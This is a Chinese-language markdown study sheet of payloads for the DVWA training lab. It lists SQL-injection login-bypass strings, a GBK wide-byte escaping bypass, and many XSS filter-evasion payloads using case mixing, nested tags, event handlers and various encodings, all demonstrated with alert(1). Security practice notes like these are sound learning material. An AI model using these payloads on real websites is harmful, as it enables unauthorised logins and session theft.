# dvwa

## bruteforce

### level：low  
<b>1.注入方式：</b>
-   源码：query  = "SELECT * FROM \`users\` WHERE user = '\$user' AND password = '\$pass';"   
-    admin' #  &emsp;或者	&emsp;admin' -- a   &emsp;或者&emsp; a' or '1' = '1' limit 1 #

### level:medium

<b>1.暴力破解 </b> 
-   burpsuit intruder
-   MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义

##  xss

1.  窃取cookie
2.  劫持流量恶意跳转
3.  xss的利用和绕过  
     -  大小写绕过
         -  这个绕过方式的出现是因为网站仅仅只过滤了`<script>`标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样：`<sCript>alert("hey!")</scRipt>`
    -  利用过滤后返回语句再次构成攻击语句来绕过
        -  `<sCri<script>pt>alert("hey!")</scRi</script>pt>`
    -  并不是只有script标签才可以插入代码
        -  `<img src='w.123' onerror='alert("hey!")'>`
        -  `<a onmousemove=alert(1)> `
        -  `<div onmouseover=‘do something here’> `
    -  编码脚本代码绕过关键字过滤
        -  `<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>`
    -   主动闭合标签实现注入代码
    -   html实体编码
        -   `<iframe src=javascript:alert(1)>`
        -   `<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`
    -   URL编码
        -   `<iframe src=”javascript:alert(1)”>test</iframe>`
        -   `<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>`
        -   Javascript解析器工作的时候将`\u0061\u006c\u0065\u0072\u0074`进行js解码后为”`alert`”，但是需要注意像圆括号、双引号、单引号不能编码，否则在这种场景下无法弹窗。
4.  xss编码详情
    -   <a href="xss.md">编码相关</a>
---
### 1.  反射型xss

- ####   level:medium
  -   要闭合 `<option><select>`标签

- ####   level:high
    - URL的部分发往服务器时#号后面的并不会发送到服务器，但是javascript代码还会正常读取，所以利用这个特性来绕过服务器端的检查。
